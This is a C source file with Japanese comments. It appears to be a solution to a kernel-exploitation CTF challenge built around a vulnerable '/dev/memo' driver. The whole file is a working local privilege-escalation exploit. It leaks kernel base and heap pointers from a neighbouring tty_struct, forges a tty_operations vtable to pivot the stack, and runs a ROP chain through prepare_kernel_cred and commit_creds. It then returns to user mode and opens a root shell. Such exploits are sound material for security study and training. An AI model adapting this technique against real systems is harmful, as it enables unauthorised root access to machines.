#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/ioctl.h>
#include<sys/types.h>

#define ulong unsigned long

ulong user_cs,user_ss,user_sp,user_rflags;

void pop_shell(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}

static void save_state(void) {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

int main(void)
{
  int memo = open("/dev/memo",O_RDWR);
  int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
  char buf[0x400];
  ulong *rop;
  ulong kernbase, kernheap;

  /**** gadgets ****/
  ulong off_ptm_unix98_ops_kernbase = 0x6191e0;
  ulong off_kernheap = 0x438;
  // 0xffffffff810243b8: push rdx ; pop rsp ; sub eax, 0x0002E5AC ; pop rax ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret  ;  (1 found)
  ulong gad1 = 0x243b8;
  // 0xffffffff810e7ae8: pop rdi ; ret  ;  (47 found)
  ulong pop_rdi = 0xe7ae8;
  // 0xffffffff8100fc8e: mov rdi, rax ; rep movsq  ; ret  ;  (1 found)
  ulong mov_rdi_rax = 0xfc8e;
  // 0xffffffff810fb892: pop rcx ; add cl, byte [rax-0x7D] ; ret  ;  (2 found)
  ulong pop_rcx = 0xfb892;
  ulong prepare_kernel_cred = 0x44850;
  ulong commit_creds = 0x44680;
  /*
   0xffffffff812009c4 <+68>:    mov    rdi,rsp
   0xffffffff812009c7 <+71>:    mov    rsp,QWORD PTR ds:0xffffffff81806004
   0xffffffff812009cf <+79>:    push   QWORD PTR [rdi+0x30]
   0xffffffff812009d2 <+82>:    push   QWORD PTR [rdi+0x28]
   0xffffffff812009d5 <+85>:    push   QWORD PTR [rdi+0x20]
   0xffffffff812009d8 <+88>:    push   QWORD PTR [rdi+0x18]
   0xffffffff812009db <+91>:    push   QWORD PTR [rdi+0x10]
   0xffffffff812009de <+94>:    push   QWORD PTR [rdi]
   0xffffffff812009e0 <+96>:    push   rax
   0xffffffff812009e1 <+97>:    xchg   ax,ax
   0xffffffff812009e3 <+99>:    mov    rdi,cr3
   0xffffffff812009e6 <+102>:   jmp    0xffffffff81200a1a <common_interrupt+154>
   0xffffffff812009e8 <+104>:   mov    rax,rdi
   0xffffffff812009eb <+107>:   and    rdi,0x7ff

  */
  ulong swapgs_restore_regs_and_return_to_usermode = 0x2009c4;


  // 状態の保存
  save_state();

  lseek(memo,0x300,SEEK_SET);
  read(memo,buf,0x400);

  // leak kernbase and kernheap
  kernbase = *(unsigned long*)(buf + 0x100 + 0x18) - off_ptm_unix98_ops_kernbase;
  printf("kernbase: %lx\n",kernbase);
  kernheap = *(unsigned long*)(buf + 0x100 + 0x38) - off_kernheap;
  printf("kernheap: %lx\n",kernheap);

  // vtableへのポインタの書き換え
  *(unsigned long*)(buf + 0xc*8) = kernbase + gad1; // fake ioctl entry
  *(unsigned long*)(buf + 0x100 + 0x18) = kernheap + 0x300; // fake vtable pointer

  lseek(memo,0x300,SEEK_SET);
  write(memo,buf,0x400); // overwrite ops and ioctl entry

  // ROP chain
  rop = (unsigned long*)buf;
  // gad1のごまかし*6
  *rop++ = 0x0;
  *rop++ = 0x0;
  *rop++ = 0x0;
  *rop++ = 0x0;
  *rop++ = 0x0;
  *rop++ = 0x0;

  // init_task の cred を入手
  *rop++ = kernbase + pop_rdi;
  *rop++ = 0;
  *rop++ = kernbase + prepare_kernel_cred;

  // 入手したcredを引数にしてcommit
  *rop++ = kernbase + pop_rcx;      // mov_rdi_raxガジェットがrepを含んでいるため、カウンタ0にしておく
  *rop++ = 0;
  *rop++ = kernbase + mov_rdi_rax;
  *rop++ = kernbase + commit_creds;

  // return to usermode by swapgs_restore_regs_and_return_to_usermode
  *rop++ = kernbase + swapgs_restore_regs_and_return_to_usermode;
  *rop++ = 0;
  *rop++ = 0;
  *rop++ = (ulong)&pop_shell;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp;
  *rop++ = user_ss;

  // invoke shell
  lseek(memo,0x0,SEEK_SET);
  write(memo,buf,0x100);
  ioctl(ptmx,kernheap,kernheap);

  return 0;
}
